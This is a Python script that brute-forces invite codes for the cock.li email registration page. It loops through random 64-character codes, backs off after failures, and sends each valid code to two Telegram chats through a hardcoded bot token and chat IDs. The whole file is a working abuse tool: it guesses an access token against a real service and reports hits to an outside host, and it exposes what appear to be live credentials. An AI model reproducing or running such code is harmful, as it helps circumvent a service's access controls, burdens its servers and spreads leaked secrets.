import requests as r
import random, string, time
#b59884f13974b19a54642dfa674100093bb8bbc6158213f6be03698ed9e306b4
url = "https://cock.li/register?invite="
i = 0
f = 1
e = 0
while i <f :
  code = ''.join(random.choices(string.ascii_lowercase + string.digits, k = 64))
  in_url = url+code
  re = r.get(in_url)
  if "Error:" in re.text:
    print("BAD " + code)
    e = e+1
    if e == 15:
     print('TOO MANY WRONGS SLEEPING FOR 30 SECS')
     time.sleep(30)
  else:
      hit = ("『ꪜ』SAYONARA 『ꪜ』\n ≈COCK.LI INVITE HIT≈\n ★INVITE CODE →   " +code)
      r.get('https://api.telegram.org/bot1451863899:AAEcQAnZxYJoUmD7lpKP_9bSuD-679iC45I/sendMessage?chat_id=-1001684754768&text='+hit)
      r.get('https://api.telegram.org/bot1451863899:AAEcQAnZxYJoUmD7lpKP_9bSuD-679iC45I/sendMessage?chat_id=1154075796&text='+hit)
      i = i +1